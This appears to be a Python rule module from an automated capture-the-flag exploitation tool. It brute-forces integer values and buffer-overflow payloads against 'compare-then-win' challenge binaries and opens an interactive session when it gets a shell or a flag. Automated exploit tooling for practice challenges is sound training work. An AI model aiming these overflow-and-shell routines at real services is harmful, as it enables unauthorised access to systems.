"""Rule: detect cmp reg, imm → win pattern and send the correct value."""
from __future__ import annotations

import struct

from pwn import log

from autopwn.agent.state import ActionResult, AttemptRecord
from autopwn.agent.action_utils import (
    open_target, verify_shell, verify_flag_output, interactive_or_close, safe_close,
)


def _condition(state) -> bool:
    return bool(state.discovered_facts.get("win_condition"))


def _action(state) -> ActionResult:
    ctx = state.ctx
    wc = state.discovered_facts["win_condition"]

    if wc["type"] == "cmp_imm":
        return _try_cmp_imm(ctx, wc)
    elif wc["type"] == "overwrite_global":
        return _try_overwrite_global(ctx, wc)

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="cmp_win", diagnosis="unknown_win_type"),
    )


def _try_cmp_imm(ctx, wc) -> ActionResult:
    """Send the expected integer value."""
    value = wc["value"]
    log.info(f"Agent cmp_win: sending value {value} ({value:#x})")

    strategies = []

    # Strategy 1: send as decimal (scanf("%d"))
    strategies.append(("decimal", str(value).encode()))

    # Strategy 2: send as raw bytes (scanf("%s") overwriting global var)
    # Fill buffer with the target value as int32/int64
    word = ctx.bits // 8
    if ctx.bits == 64:
        val_bytes = struct.pack("<Q", value)
    else:
        val_bytes = struct.pack("<I", value)
    # Repeat to cover various array positions
    for repeat in (14, 20, 30):
        strategies.append((f"fill_x{repeat}", val_bytes * repeat))

    # Strategy 3: send as hex string
    strategies.append(("hex", hex(value).encode()))

    # Strategy 4: padding + value at a specific offset
    # For scanf("%s") writing to an array where check is at a known offset.
    # The null terminator from scanf ensures bytes after the value are zero.
    check_offset = wc.get("check_offset", 0)
    val_trimmed = val_bytes.rstrip(b"\x00") or val_bytes[:1]
    if check_offset > 0:
        # Known offset from observer — try it first
        strategies.insert(1, (f"offset_{check_offset:#x}",
                              b"A" * check_offset + val_trimmed))
    # Also try common array element offsets (dword-aligned)
    for off in (0x20, 0x28, 0x30, 0x34, 0x38, 0x3c, 0x40, 0x48, 0x50):
        if off != check_offset:
            strategies.append((f"pad{off:#x}", b"A" * off + val_trimmed))

    for name, payload in strategies:
        io = None
        try:
            io = open_target(ctx)
            try:
                io.recv(timeout=1)
            except Exception:
                pass

            io.sendline(payload)

            # First check for flag output (program may print flag and exit)
            if verify_flag_output(io):
                log.success(f"Agent cmp_win: strategy {name} got flag!")
                safe_close(io)
                return ActionResult(
                    success=True,
                    record=AttemptRecord(strategy="cmp_win", success=True),
                )

            # Then check for shell
            if verify_shell(io):
                log.success(f"Agent cmp_win: strategy {name} got shell!")
                return ActionResult(
                    success=interactive_or_close(io, True),
                    record=AttemptRecord(strategy="cmp_win", success=True),
                )

            safe_close(io)
        except Exception as exc:
            log.debug(f"cmp_win {name} error: {exc}")
            if io:
                safe_close(io)

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="cmp_win", diagnosis="value_sent_but_no_shell"),
    )


def _try_overwrite_global(ctx, wc) -> ActionResult:
    """Overwrite a global variable via scanf("%s") overflow to trigger win."""
    cmp_info = wc.get("cmp_info", {})
    target_value = cmp_info.get("value", 0)

    if not target_value:
        return ActionResult(success=False, terminal=True,
                            record=AttemptRecord(strategy="cmp_win", diagnosis="no_target_value"))

    log.info(f"Agent cmp_win: overwrite global to {target_value:#x}")

    word = ctx.bits // 8

    # Strategy: fill scanf buffer with target_value repeated
    # ciscn_2019_n_8 pattern: scanf("%s", var) where var is int array,
    # check var[13]==0x11 and var[14]==0 → fill with all target_value
    # Also try: padding + target_value at specific offsets
    io = None

    # Strategy A: fill entire buffer with the target value (works for array patterns)
    for repeat_count in (14, 20, 30, 50):
        try:
            io = open_target(ctx)
            try:
                io.recv(timeout=1)
            except Exception:
                pass

            if ctx.bits == 64:
                payload = struct.pack("<Q", target_value) * repeat_count
            else:
                payload = struct.pack("<I", target_value) * repeat_count

            io.sendline(payload)

            if verify_shell(io):
                log.success(f"Agent cmp_win: global fill x{repeat_count} worked!")
                return ActionResult(
                    success=interactive_or_close(io, True),
                    record=AttemptRecord(strategy="cmp_win", success=True),
                )
            if verify_flag_output(io):
                log.success(f"Agent cmp_win: global fill x{repeat_count} flag!")
                return ActionResult(
                    success=True,
                    record=AttemptRecord(strategy="cmp_win", success=True),
                )
            safe_close(io)
            io = None
        except Exception:
            if io:
                safe_close(io)
                io = None

    # Strategy B: padding + target_value at specific offsets
    for pad_len in range(0x10, 0x100, 4):
        try:
            io = open_target(ctx)
            try:
                io.recv(timeout=1)
            except Exception:
                pass

            if ctx.bits == 64:
                payload = b"\x00" * pad_len + struct.pack("<Q", target_value)
            else:
                payload = b"\x00" * pad_len + struct.pack("<I", target_value)

            # Can't use \x00 with scanf("%s") — use non-null padding instead
            if ctx.bits == 64:
                payload = struct.pack("<Q", target_value) * (pad_len // 8 + 1)
            else:
                payload = struct.pack("<I", target_value) * (pad_len // 4 + 1)

            io.sendline(payload)

            if verify_shell(io):
                return ActionResult(
                    success=interactive_or_close(io, True),
                    record=AttemptRecord(strategy="cmp_win", success=True),
                )
            if verify_flag_output(io):
                return ActionResult(
                    success=True,
                    record=AttemptRecord(strategy="cmp_win", success=True),
                )
            safe_close(io)
            io = None
        except Exception:
            if io:
                safe_close(io)
                io = None

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="cmp_win", diagnosis="overwrite_brute_failed"),
    )


RULES = [
    ("cmp_win", 80, "send correct value for cmp→win pattern",
     _condition, _action),
]
